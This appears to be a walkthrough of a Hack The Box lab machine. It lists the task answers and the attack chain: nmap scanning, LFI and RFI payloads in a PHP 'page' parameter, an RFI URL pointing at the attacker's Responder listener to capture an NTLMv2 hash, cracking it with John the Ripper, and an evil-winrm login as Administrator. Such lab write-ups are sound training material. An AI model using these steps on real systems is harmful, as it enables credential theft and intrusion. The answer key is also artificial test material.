
Youtube Walkthrough 

    https://www.youtube.com/watch?v=R8GOLiKIA1k

nmap -p- --min-rate 1000 -sV IP Address

-p- : This flag scans for all TCP ports ranging from 0-65535

-sV : Attempts to determine the version of the service running on a port

--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher



TASK 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?


    Open browser
        Type http://IP Address

## Answer: Unika.htb


# Error

    Web browser is not showing...

    Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of
    each name) on a single server. This allows one server to share its resources, such as memory and processor
    cycles, without requiring all the services to be used by the same hostname.
    The web server checks the domain name provided in the Host header field of the HTTP request and sends
    a response according to that.
    The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in
    the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb .
    Entry in the /etc/hosts file :

    Command: 
        echo "IP Address unika.htb" | sudo tee -a /etc/hosts

    Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to
    the corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in
    every HTTP request that the browser sends to this IP address, which will make the server respond with the
    webpage for unika.htb.

TASK 2

Which scripting language is being used on the server to generate webpages?


![Alt text](<Screenshot 2023-07-27 at 9.34.40 PM.png>)



## Answer: php

        What is PHP?
        
        PHP (Hypertext Preprocessor) is a widely-used, open-source server-side scripting language designed primarily for web development. It is especially well-suited for creating dynamic and interactive web pages. PHP scripts are executed on the server-side, meaning the PHP code is processed on the web server before the resulting HTML is sent to the user's browser, allowing for dynamic content generation.

TASK 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

    Refer to image above.

## Answer: page

TASK 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

    File Inclusion Wordlist: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

            List includes 

## Answer: ../../../../../../../../windows/system32/drivers/etc/hosts

TASK 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

The answer is in the question. 


## Answer: //10.10.14.6/somefile


TASK 6

What does NTLM stand for?

Google search what NTLM.

## New Techonolgy Lan Manager


TASK 7

Which flag do we use in the Responder utility to specify the network interface?


Go into your terminal and type "responder -h" to pull up help screen for responder.

## Answer: -I

TASK 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.


## Answer: John The Ripper


TASK 9

What is the password for the administrator user?

Open Repsonder

    Type in terminal 

            responder -I Tun0

                This will set responder to listen
                Find IP address and type in the browser

            http://unika.htb/index.php?page=//10.10.14.8//somefile

                Responder will then provide a hash
                Copy from administrator to end of hash

        In terminal type
            
            subl hash 
                        this creates a doc for the hash
                        Paste the hash into the Doc 
                        save file onto desktop 
                        run John the ripper

            john --wordlist=/usr/share/wordlist/rockyou.txt hash

                        If you recieve an error saying file or directory ot found ensure you saved the hash to your desktop

## Answer: badminton


TASK 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

## Answer: 5985

SUBMIT FLAG

    Run evil-winrm in Terminal 

            evil-winrm -h

            evil-winrm -i (IP Address) -u Administrator -p badminton

    now you should have access to the windows system, 
    now search for root flag using cd to change directories and ls to list the files and folders
    Happy Hacking!




Submit root flag

Look into Mike Folder when you gain access.